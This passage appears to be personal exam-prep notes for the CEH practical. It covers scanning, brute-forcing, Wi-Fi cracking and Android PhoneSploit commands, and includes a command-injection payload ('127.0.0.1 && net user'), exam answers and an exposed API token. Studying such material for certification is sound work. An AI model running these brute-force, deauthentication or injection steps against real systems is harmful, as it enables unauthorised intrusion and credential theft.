+Select Option: 4 (Access shell on a phone).
+Scan Folder location
+/sdcard/Notification/Scan/ (find image files)
+Pull folders from phone to pc “Enter location of flag dir /sdcard/Notifications/scans/”
+“Enter location where you want to save dir: /home/parrot/Desktop/”
+To analyze image use following:
+Openstego (recommended)
+Steghide extract –sf image.jpg</code></pre><h1 id="18ab2af3-f9ef-80f1-9817-dcc7e5d1464c" class="">Cryptography</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8055-ae47-e4d754683df0" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">1. CryptoForge (For encrypting/decrypting files)
+
+2. BCTextEncoder (For encoding/data to hex format)
+Use BCTextEncoder to decrypt the encoded secret file, 
+psw can be the same of SMB login 
+Starts with -----BEGIN ENCODED MESSAGE-----, Version: Tool name etc and text.
+Copy everything and paste in encoded text tab and add password and tap decode.
+
+3.Cryptool (For encrypting/decrypting files)
+Given file which is secret.hex, open in cryptool and then tap on analysis
+after that, check which algorithm the question hints towards and select that
+select key length and start. analyze the results.
+Decrypt file: open CrypTool program -&gt; Encrypt/Decrypt -&gt; Symmetric (modern) -&gt; DES (ECB)
+
+4. VeraCrypt (For encrypting/decrypting hidden partitions)
+Open veracrypt and select the suspicious file (size would be greater than 50MB)
+select a drive name(any)
+press mount and enter password. The hidden drive should be visible in my pc).
+There is an inner volume(hidden) and outer volume(unhidden).
+Check both, they can have the same password or different passwords as well.
+
+</code></pre><h1 id="18ab2af3-f9ef-8036-8b15-edce9d649238" class="">Web Applications</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="190b2af3-f9ef-80e2-946e-ecefc093b04d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">
+PHP SHELLS:
+https://w0rms.com/</code></pre><h2 id="259b2af3-f9ef-80d4-bdf5-d6d88cb53769" class="">WPSCAN</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-806b-a091-e4f04a622ed6" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">#Identify psw associated with an account
+wpscan --url http://192.168.1.10:8080/CEH -u sarah -P passwdlist.txt 
+wpscan --url http://10.10.10.12:8080/CEH --enumerate u --api-token FErWifGJWLb7iMVVsEQVxrG4IP6TFDBadnfM6ssp7uQ
+OR 
+#WP Password Bruteforce
+use auxiliary/scanner/http/wordpress_login_enum 
+
+#Page_id
+Gobuster dir –u http://website –w /usr/share/wordlists/dirb/common.txt
+Use wpscan to find login credentials
+sqlmap -u &quot;http://website/page_id=x/&quot; -t 4 --dbs
+wpscan --url http://www.cehorg.com/ -e u,vp
+wpscan --url http://www.cehorg.com/ -e u --wordlist /usr/share/wordlists/
+wpscan --url http://www.cehorg.comORIP --enumerate u,t,p,vp --api-token
+</code></pre><h2 id="259b2af3-f9ef-807b-b5fb-d2413c3e97b3" class="">Dir Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8022-8615-dc60c140494f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -o gobuster.txt
+gobuster dir -u http://IP:Port -w wordlist.txt
+
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o gobuster_root_dirs.txt
+# Recursively scan discovered directories
+for dir in $(grep &quot;/$&quot; gobuster_root_dirs.txt | awk &#x27;{print $2}&#x27;); do
+    gobuster dir -u &quot;http://target.com$dir&quot; -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o &quot;gobuster_$(basename $dir)_dirs.txt&quot;
+done
+
+# Scan root for content files
+gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x txt,php,html,js,json,xml -o gobuster_root_files.txt
+
+# Scan discovered directories for content files
+for dir in $(grep &quot;/$&quot; gobuster_root_dirs.txt | awk &#x27;{print $2}&#x27;); do
+    gobuster dir -u &quot;http://target.com$dir&quot; -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x txt,php,html,js,json,xml -o &quot;gobuster_$(basename $dir)_files.txt&quot;
+done
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+-u http://target.com/FUZZ \
+-t 50 \
+-mc 200,301,302 \
+-e .php,.html,.txt,.js,.json,.xml \
+-recursive \
+-o ffuf_fullscan.txt</code></pre><h1 id="18ab2af3-f9ef-80c7-b888-c3faf08610e6" class="">Hashes</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8020-aa88-ecefd97d7708" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">hashes.com
+hashmyfiles (for calculating and comparing hashes of files) (windows tool)
+Crackstation
+Cyberchef
+emn178.github.io/online-tools/crc32_checksum.html</code></pre><h1 id="259b2af3-f9ef-8069-86cb-d3443ac49f36" class="">Extra </h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8046-939b-fbf323f5ff0d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">1). Use: https://www.ipvoid.com/ip-geolocation/ to find latitude/longitude.
+2). DNS Zone Transfer: use dig command
+Step 1: dig example.com NS
+Step 2: dig axfr @(mention the nameserver.com) example.com
+
+3). To find live machines:
+use ex: nmap -sn 0.0.0.0/24(IP)
+
+4). find open ports use: nmap ip/24
+5). To find Domain Controller machine
+use: nmap -p 389, 636, 88, 3268 ip/24
+
+6). To find Netbios name &amp; FQDN of the host
+use: nmap -sC ip --top-ports=20
+
+7). To find DNS Computer Name of the Domain controller
+use: nmap -sC ip --top-ports=20
+
+8). To identify the OpenSSH Version
+use: nmap -p 22 ip/24 --open -T5
+nmap -p 22 ip/24 --open -T5 -sV
+
+9). To find OS of the machine
+use: Step 1: nmap -p 3306 ip/24 --open
+Step 2: nmap -O ip(you found open) -sV -T5
+
+10). To do LDAP Enumeration, find how many users account are associated with the domain.
+use: nmap ip --script=*user*
+
+11). To find LDAP Version
+use: ldapsearch -x -H ldap://ip
+
+12). To check NFS service enabled
+Use: nmap -p 111 ip/24 --open
+
+13). DNS enumeration on www.certifiedhacker.com and find out name servers used by the domain.
+Use: nslookup -type=ns www.certifiedhacker.com
+
+14). To Find address of the machine running SMTP service on the network.
+Use: nmap -p 111 ip/24 --open -T5
+nmap -p 25 ip/24 --open -T5
+
+15). Perform an SMB Enumeration on given ip and check whether the messaging signing feature is enabled or disabled.
+use: nmap -p 445 ip -sC -T5
+
+16). To find CVE score use NVD: https://nvd.nist.gov/vuln/detail/
+17). Openvas:
+Install from Kali/OpenVas repositories:
+This way varies in difficulty because of the needed configurations, you can simply install it with apt.
+sudo apt-get update -y &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y
+sudo apt-get install openvas
+sudo gvm-setup
+sudo gvm-check-setup
+sudo gvm-start
+
+1). To crack password:
+Use: john ~/Documents/hashes.txt --format=NT --wordlist ~/Desktop/Wordlist/password.txt
+
+2). Find out the Password: 10.10.10.25
+Use: Lophtcrack
+L0phtCrack -&gt; Password Auditing wizard -&gt; Next -&gt; Next -&gt; A Remote machine -&gt; Host(ip) -&gt; Use specific user credentials -&gt; Username (Administrator), Password (given) -&gt; Next -&gt; ~~~ -&gt; finish
+
+3). To Extact hidden information
+Use: Snow.exe -C
+step 1: open windows poweshell
+step 2: SNOW.EXE -C “C:\path of the file\file.txt”
+
+4). To Extract data in Image
+Use: OpenStego — use extract hidden data.
+
+5). Wireshark
+Wireshark -&gt; Statistics -&gt; conversations -&gt; TCP16R3@D_M3
+ip.src==10.10.1.10 &amp;&amp; tcp.srcport==8888 &amp;&amp; ip.dst=172.16.0.11 &amp;&amp; tcp.dstport==9999
+
+6). To found data from malware face.exe.
+Use: BinText
+
+7). To Analyze ELF executable (sample-elf)
+Use: In terminal — cd Documents/
+step 2: file Sample-ELF
+
+(or) use Ghidra tool
+
+8). To perform windows service monitoring &amp; find out the service type “afunix”
+Use : (Get-Service -Name “afunix”).ServiceType
+
+9). To perform DHCP starvation attack. 
+find the transaction ID of the DHCP discover packets.
+Use: sudo tcpdump -i eth0 -v
+yersinai -G Launch attack --&gt; DHCP --&gt; sending Discover packet --&gt; OK
+
+10). To analyse and find out the protocol used for sniffing on its network.
+Use filter and search arp
+
+11). To analyze packet id that uses ICMP protocol
+use filter and search icmp in wireshark
+Then see the info field there you have an id.
+
+12). In the web application movies.cehorg.com running on its network is leaking credentials in plain text.
+Use: http.request.method==POSTS
+
+13). To find the length of the data in UDP packet.
+Use filter udp
+and search the data
+
+14). The DoS attack has been launched on the target machine. Find the ip address of the attacker’s machine. 192.168.0.51
+Use Conversations in wireshark
+
+15). To determine the no of machines used to initiate the attack.3
+Use conversations, DDOS — ipv4
+
+1). Suspects of a possible Session hijacking attack on a machine. Find out the protocol used to sniffing the network.
+Use filter ARP
+
+2). To perform HTTP-recon on the website and find out the version of nginx used by the webserver.
+Use: whatweb www.example.com
+
+3). An FTP site hosted on a machine in the network. crack the FTP credentials, obtain the flag.txt. Martin- qwerty1234
+Open module 13 in desktop
+use: hydra -L Username.txt -P Passwords.txt 172.16.0.12 ftp
+step 2: ftp 172.16.0.12
+ftp &gt; ls
+ftp &gt; mget *
+cat flag.txt
+
+4). Perform Banner grabbing &amp; Etag
+Use: telnet example.com 80
+step 2: GET / HTTP/1.0
+
+5). To identify Content Management system used by example.com
+Use: whatweb example.com (or) waplayzzer (or) wig example.com
+
+6). Perform web application reconnaissance on example.com and find out the HTTP server used by the web application.
+Use: whatweb example.com
+
+7). To perform web crawling on the web application example.com
+and identify the no of live png files in image folderr.
+Use: curl http://example.com/ | grep .png | wc -l
+
+8). To identify load balancer service used by example.com
+Use: whatweb example.com (or) lbd example.com
+
+9). Perform a bruteforce attack on www.cehorg.com and find the password of user adam.
+Use: wpscan --url http://cehorg.com/ -U adam -P /home/attacker/Desktop/ Wordlist/password.txt
+or find the password.txt file and open to see the password.
+
+10). Perform parameter tampering on movies.cehorg.com and find out the user for id 1003.
+Step 1: open the browser and search movies.cehorg.com
+step 2: login the page using found password jason/welcome
+Step 3: movies.cehorg.com/viewprofile.aspx?id=1003
+
+11). Perform command injection on 10.10.10.25 and find out how many user accounts are registered with the machine. 8
+Step 1: open browser and search 10.10.10.25:8080
+Step 2: select command injection
+Step 3: Enter “127.0.0.1 &amp;&amp; net user” in ping a device
+
+12).A file named hash.txt has been upload through DVWA http://10.10.10.25:8080/DVWA 
+Note: Username- admin; Password- password 
+Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt 
+Hint: Use “type” command to view the file. 
+Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash
+https://hashes.com/en/decrypt/hash
+Use: https://crackstation.net
+
+1). The mobile device of an employee in CEHORG has been hacked by the hacker to perform DoS attack on one of the server in company network. You are assigned to analyse “Andro.pcapng” located in Documents directory of EH workstation-2 and identify the severity level of the attack. (Note: perform deep down Expert Info analysis)
+Use: wireshark → Analyze → Expert information
+
+2). An attacker has hacked one of the employees android device in CEHORG and initiated LOIC attack from the device. You are an ethical hacker who had obtained a screenshot of the attack using a background application. Obtain the screenshot of the attack using PhoneSploit from the attacked mobile device 
+Determine the targeted machine IP along with send method.
+Use: PhoneSploit
+Step 1: In terminal cd PhoneSploit/
+Step 2: python phonesploit.py
+Step 3: phoneSploit &gt; 24 (use Keycode)
+
+3). An employee in CEHORG has secretely acquired confidential access ID through an application from the company
+Step 1: In the Phonesploit folder open terminal there
+step 2: command “adb shell”
+Step 3: su root
+step 4: cd sdcard/Download/
+Step 5: ls
+Step 6: cat confidential.txt
+step 7: 80099889 x86_64
+
+4). An attacker has hacked one of the employees android device in CEHORG and initiated LOIC attack from the device. You are an ethical hacker who had obtained a screenshot of the attack using a background application. Obtain the screenshot of the attack using PhoneSploit from the attacked mobile device and determine the targeted machine IP along with send method.
+Step 1: Open PhoneSploit
+Step 2: connect the phone using 172.16.0.21
+Step 3: Select 1
+Step 4: Select 9
+Step 5: Enter the file location in file pull &gt; sdcard/DCIM/capture.png
+Step 6: Enter save the file location to &gt; /home/attacker/Desktop
+Step 7: Open the image — 172.16.0.11/HTTP
+
+5). An attacker installed a malicious mobile application ‘AntiMalwarescanner.apk’ on the victims android device which is located in EH workstation-2 documents folder. You are assigned a task to perform security audit on the mobile application and find out whether the application using permission to Read-call-logs.
+Use: https://sisik.eu/apk-tool
+
+6). CEHORG hosts multiple IOT devices and sensors to manage its supply chain fleet. You are assinged a task to examine the file “IOT Traffic.pcapng” located in the Home directory of the root user in the “EH Workstation — 1” machine. Analyze the packet and find the topic of the message sent to the sensor.
+Use: wireshark → filter → mqtt
+
+see line no 49 and drop down the MQ Telenetry Transport there you see the topic Fleet_Count
+
+7). CEHORG hosts multiple IOT devices and network sensors to manage its IT-department. You are assigned a task to examine the file “NetworkNS_Traffic.pcapng” located in the Documents folder of the user in the “EH Workstation — 2” machine. Analyze the packet and find the alert message sent to the sensor. Data Bre@ch @lert
+Use: wireshark → filter → mqtt
+see line no 201 High_Ber select that and see the traffic
+(or) use “filter tcp.stream eq 1&quot;
+
+8). An attacker has intruded into the CEHORG network with malicious intent. He has identified a vulnerability in a machine. He has encoded the machine’s IP address and left it in the database. While auditing the database, the encoded file was identified by the database admin. Decode the EncodedFile.txt file in the Document folder in the “EH Workstation — 2” machine and enter the IP address as the answer. (Hint: Password to decode the file is Pa$$w0rd). 10.10.10.31
+Use: BCTextEncoder
+Upload the EncodedFile.txt and enter the password
+
+9).The Access code of an employee was stolen from the CEHORG database. The attacker has encrypted the file using the Advance Encryption Package. You have been assigned a task to decrypt the file; the organization has retained the cipher file “”AccessCode.docx.aes”” in the Document folder in the “”EH Workstation — 2&quot;” machine. Determine the access code by decrypting the file. Hint: Use “”qwerty”” as the decryption password. Note: Advanced Encryption Package is available at E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptography Tools.
+Use: AES-Tool
+upload the AccessCode.dox.aes and enter the password qwerty
+
+10). A VeraCrypt volume file “secret” is stored on the Document folder in the “EH Workstation — 2” machine. You are an ethical hacker working with CEHORG; you have been tasked to decrypt the encrypted volume and determine the number of files stored in the volume. (Hint: Password: test).6
+Use: VeraCrypt tool
+select the file “secret in the document folder
+Enter the mount button
+
+11). An attacker had sent a message 166.150.247.183/US to the victim. You are assigned to perform footprinting using shodan.io in order to identify whether the message belongs to SCADA/ICS/IoT systems in US.
+&gt; IoT
+
+12). An attacker had sent a file cryt-128–06encr.hex containing ransom file password, which is located in documents folder of EH-workstation-2. You are assigned a task to decrypt the file using cryp tool. Perform cryptanalysis, Identify the algorithm used for file encryption and hidden text. Note: check filename for key length and hex characters. @!ph@|tE*t
+Use: Cryptool
+open the Cryptool and upload the hex folder in documents, select encrypt/decrypt → symmentric modern → Further Algorithms → Twofish
+Key length 128
+Enter encrypt button</code></pre><h1 id="18ab2af3-f9ef-80cb-9899-f2db075dce6c" class="">Wifi Hacking 101</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-80b3-84f6-d60cc3726778" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">iwconfig
+sudo airmon-ng start [network-interface]
+
+Kill any processes that might interfere with the network adapter.
+sudo airmon-ng check kill
+
+Capture Traffic &amp; Nearby Wifi Networks
+// airodump-ng will display a list of detected access points
+// and also a list of connected clients (“stations”).
+// Use this to find the bssid &amp; the channel of the target network
+sudo airodump-ng [network-interface]
+
+// Capture the packets and export it to your machine
+sudo airodump-ng --bssid [target-bssid] -c [channel-id] --write [filename] [network-adapter]
+
+// Deauth the users that are connected to the target network
+// User will need to input the wifi password to connect again
+sudo aireplay-ng --deauth [number-of-packets(&gt;50)] -a [target-bssid] [network-adapter]
+
+// If there is an error caused by the channel like the image bellow,
+// Restart the interface with the target channel
+sudo airmon-ng start [network-adapter] [target-channel]
+
+// Crack the wifi password using aircrack
+sudo aircrack-ng -b [target-bssid] [packet-file(.cap)] -w [wordlist]
+
+aircrack-ng -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt NinjaJc01-01.cap
+
+aircrack-ng pcapfile
+aircrack-ng -w passwordlist pcapfile
+aircrack-ng -b BSSID -w passwordlist pcapfile
+aricrack-ng Pcap.cap -w /home/attacker/Desktop/password.txt </code></pre><h1 id="259b2af3-f9ef-8071-a19c-d973c7c35f5e" class="">Useful Commands</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8069-9663-fb7124a50b20" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">find / -type f -iname &quot;flag1.txt&quot; 2&gt;/dev/null : find the file named &quot;flag1.txt&quot; case insensitive under / and not showing output errors 
+find . -name flag1.txt : find the file named &quot;flag1.txt&quot; in the current directory 
+find /home -name flag1.txt : find the file names &quot;flag1.txt&quot; in the /home directory 
+find / -type d -name config : find the directory named config under &quot;/&quot; 
+find / -type f -perm 0777 : find files with the 777 permissions (files readable, writable, and executable by all users) 
+find / -perm a=x : find executable files find /home -user frank : find all files for user &quot;frank&quot; under &quot;/home&quot; 
+find / -mtime 10 : find files that were modified in the last 10 days 
+find / -atime 10 : find files that were accessed in the last 10 day 
+find / -cmin -60 : find files changed within the last hour (60 minutes) 
+find / -amin -60 : find files accesses within the last hour (60 minutes) 
+find / -size 50M: find files with a 50 MB size
+
+find / -writable -type d 2&gt;/dev/null : Find world-writeable folders 
+find / -perm -222 -type d 2&gt;/dev/null : Find world-writeable folders 
+find / -perm -o w -type d 2&gt;/dev/null : Find world-writeable folders
+
+find / -perm -o x -type d 2&gt;/dev/null : Find world-executable folders 
+
+find / -name perl* 
+find / -name python* 
+find / -name gcc* 
+
+find / -perm -u=s -type f 2&gt;/dev/null : Find files with the SUID bit
+
+IN WINDOWS
+search -f flag.txt 
+
+sudo find / -type f –iname “Netnormal” 2&gt;/dev/null (f=file, d=dir, iname=not case sensitive)
+find / -name &quot;flag.txt&quot; 2&gt;/dev/null
+</code></pre><ul id="258b2af3-f9ef-80f3-9b69-d158ce987d54" class="toggle"><li><details open=""><summary>Extra Stuff</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-804a-b3f0-ec3d241cbfe5" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">mathew password sql injection.... Answer 12345678
+
+Iot network question was simple... Just enter mqt... There were 9 packet anaylize it... Public message... 
+High_temp
+
+One was question of stenography... Confid.txt... I used snow.exe...... Snow.exe was in folder of system hacking..... I was searching for it on cryptography but it was in the system hacking then I installed it
+
+Nmap -sV -p 3389 --open 10.10.20.0/24
+Use these command for smb and rdp and android port 5555
+
+Perform a vuln scan for the host with the IP add 192.168.44.32, what is the CVE number of vuln with least score? 
+(CVE-2020-7068)
+During the course of an attk investigation, it was identified that a windows web dev evnironment was exploited to gain unauth access to the system. perform an -indepth network scan and thru service enum to determine the version of imap mercury service running on the server
+4.62
+Exe file named ghostware duing an assignment, give last 4 characters of the SHA224 hash for the ELF64 exe.
+8b3e
+Large-scale DDOS targeting ip address 172.22.10.10, analyze the traffic to identify the IP address of the attacker
+10.10.55.11
+Trade secrets of a company using veracrypt, mass1nfo volume stored. The password hash required to access the machine is in hashed1nfo.txt. Decrypt hash and access veracrypt volume to find secret in CS_eng.txt
+1nfo$ec3(
+</code></pre></details></li></ul><h1 id="18ab2af3-f9ef-8074-9c4c-cc9bb4804ecf" class="">THM ROOMS</h1><ul id="18ab2af3-f9ef-80ba-a345-cd5c5c06d96e" class="toggle"><li><details open=""><summary><strong>THM rooms</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-80de-a46e-c1206a59488c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Nmap
+Hydra
+JohnTheRipper
+SQLMap
+Wireshark
+Wirectf
+OpenVAS
+Metasploit
+Daily bugle
+Revenge
+Owasp top 10
+Picklerick
+Owasp juice shop
+Anthem
+Brooklynnienine
+Agentsudoctf
+Eastcft
+Simplectf
+Kenobi
+Blue
+Ccpentesting
+Zthweb2
+WordPress
+Expose
+Blog
+Crackthehash
+Hashing
+Android hacking
+Trojans
+Wifi hacking
+Malware analysis
+Jurassic park
+Advent of cyber 1–2–3
+Toolsrus</code></pre></details></li></ul><h1 id="18ab2af3-f9ef-8090-ac3a-d5d12ede3b34" class="">Vulnhub Machines</h1><ul id="18ab2af3-f9ef-800f-b089-ee3564993f18" class="toggle"><li><details open=""><summary><strong>Vulnhub Machines</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8035-9238-cae0cc265f17" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Beginner Level
+1. Mr. Robot
+2. Kioptrix Series (Levels 1–5)
+3. Metasploitable 2
+
+Intermediate Level
+4. DC Series (DC-1 to DC-9)
+5. Bulldog
+6. Symfonos Series
+
+Advanced Level(optional)
+7. Jefferson
+8. FristiLeaks
+9. SkyTower
+
+Specialized Machines(optional)
+10. VulnOS
+11. PwnLab
+12. Raven Series</code></pre></details></li></ul><h1 id="18ab2af3-f9ef-80e0-be0e-ce72c341b475" class="">YT Playlists</h1><ul id="18ab2af3-f9ef-8060-9ec9-c7e03b5af390" class="toggle"><li><details open=""><summary><strong>YT Tutorials / Playlists</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-80bf-8f53-e9bfc573d4b9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">https://youtube.com/playlist?list=PL-Fa25Pu8l6wV1Se-bPY-Onc6t_mUTZHW&amp;si=sMWxzGYRWMkJcY7d
+
+https://youtube.com/playlist?list=PLZEA2EJpqSWfouVNPkl37AWEVCj6A2mdz&amp;si=gJrDdtWCRFYVBZRa
+
